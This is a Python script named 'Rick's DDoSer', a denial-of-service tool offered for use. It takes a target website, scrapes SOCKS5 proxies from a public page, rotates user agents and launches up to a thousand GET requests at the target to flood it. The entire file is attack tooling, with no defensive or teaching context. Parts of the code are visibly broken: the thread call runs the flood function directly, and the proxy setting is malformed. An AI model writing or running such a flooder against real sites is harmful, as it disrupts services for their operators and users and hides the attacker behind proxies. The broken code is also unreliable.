import os
import argparse
import threading
import time
import re
import requests
from random import randrange
from termcolor import colored

def banner():
    try:
        os.system("clear")
    except Exception as e:
        os.system("cls")
    print(colored("""
  ____  _      _    _       ____  ____       ____  
 |  _ \(_) ___| | _( )___  |  _ \|  _ \  ___/ ___| 
 | |_) | |/ __| |/ /// __| | | | | | | |/ _ \___ \ 
 |  _ <| | (__|   <  \__ \ | |_| | |_| | (_) |__) |
 |_| \_\_|\___|_|\_\ |___/ |____/|____/ \___/____/ 
""", 'green'))
    print(colored("Rick's DDoSer (2022)\n\n", 'yellow'))

def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--user_agents',
                        dest = "user_agents",
                        help = "Filename of user agents file",
                        default = "user_agents.txt",
                        required = False)
    parser.add_argument('-t','--target',
                        dest = "target",
                        help = "Target website",
                        default = "http://example.com",
                        required = True)
    parser.add_argument('-tr','--threads',
                        dest = "threads",
                        help = "Number of threads",
                        default = 1000,
                        required = False)
    parser.add_argument('-s','--sleep',
                        dest = "sleep",
                        help = "Breakpoint after number of threads processed",
                        default = 100,
                        required = False)
    return parser.parse_args()

def get_user_agents(filename: str):
    user_agents = []
    with open(filename, 'r') as f:
        content = f.readlines()
        for user_agent in content:
            user_agents.append(str(user_agent.strip()))
    return user_agents

def get_proxies():
    URL = "http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"
    req = requests.get(URL, timeout=10)
    content = req.text
    proxies = re.findall(r"(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", content)
    return proxies

def flood(user_agent: str, proxy: str, target: str, thread: int):
    print(colored("flood: thread #{}".format(str(thread)), 'cyan'))
    headers = {
        'User-Agent': user_agent,
        'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    proxies = {
        'socks5': proxy
    }
    try: 
        req = requests.get(target, headers=headers, proxies=proxies, timeout=5)
    except Exception as e:
        print(colored("Error: " + str(e), 'red'))
        pass

def main():
    banner()
    ua_filename = parse_args().user_agents
    user_agents = get_user_agents(ua_filename)
    proxies = get_proxies()
    target = parse_args().target
    threads = int(parse_args().threads)
    sleep = int(parse_args().sleep)
    print(colored("sending the attack to: ",'green'), colored(f"{target}", 'yellow'))
    
    for thread in range (1, threads):
        user_agent = user_agents[randrange(len(user_agents) - 1)]
        proxy = proxies[randrange(len(proxies) - 1)]
        t = threading.Thread(flood(user_agent, proxy, target, thread, ))
        t.start()
        if thread % sleep == 0:
            time.sleep(10)
    t.join()
    print(colored("Finished!", 'green'))

if __name__ == "__main__":
    main()
